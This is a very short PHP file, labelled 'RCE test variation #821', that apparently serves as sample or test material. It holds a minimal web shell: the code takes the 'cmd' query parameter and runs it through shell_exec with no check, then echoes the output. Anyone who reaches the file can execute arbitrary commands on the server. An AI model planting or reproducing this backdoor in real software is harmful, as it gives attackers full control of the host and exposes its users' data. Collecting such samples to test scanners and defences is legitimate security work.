<?php
// RCE test variation #821
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>